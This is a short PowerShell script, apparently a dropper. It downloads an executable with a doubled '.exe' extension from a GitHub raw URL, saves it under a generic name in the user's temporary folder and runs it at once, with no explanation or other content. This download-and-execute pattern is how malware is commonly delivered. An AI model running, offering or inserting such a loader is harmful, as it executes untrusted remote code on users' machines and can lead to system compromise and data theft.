$url = "https://raw.githubusercontent.com/fasa3e/-24/refs/heads/main/Vanish.exe1.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
